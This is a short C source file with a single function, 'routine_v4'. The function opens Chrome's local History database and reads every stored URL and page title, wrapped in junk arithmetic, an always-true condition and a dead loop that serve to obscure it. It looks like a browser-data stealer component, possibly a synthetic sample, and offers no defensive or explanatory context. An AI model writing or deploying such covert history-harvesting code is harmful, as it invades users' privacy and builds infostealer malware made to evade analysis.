#include <windows.h>
#include <wincrypt.h>

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
int sqlite3_open(const char *, sqlite3 **);
int sqlite3_prepare_v2(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
int sqlite3_step(sqlite3_stmt *);
const unsigned char *sqlite3_column_text(sqlite3_stmt *, int);
int sqlite3_finalize(sqlite3_stmt *);
int sqlite3_close(sqlite3 *);

void __attribute__((noinline)) __attribute__((used)) routine_v4()
{
    int j1 = 0xBEEF;
    j1 <<= 4;
    if (j1 * j1 >= 0)
    {
        char db_path[260];
        ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History", db_path, 260);
        for (int i = 0; i < 4; i++)
        {
            int k = (i << 1) ^ i;
        }
        sqlite3 *db = 0;
        sqlite3_open(db_path, &db);
        sqlite3_stmt *stmt = 0;
        sqlite3_prepare_v2(db, "SELECT url, title FROM urls", -1, &stmt, 0);
        while (sqlite3_step(stmt) == 100)
        {
            const unsigned char *url = sqlite3_column_text(stmt, 0);
            const unsigned char *title = sqlite3_column_text(stmt, 1);
        }
        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }
}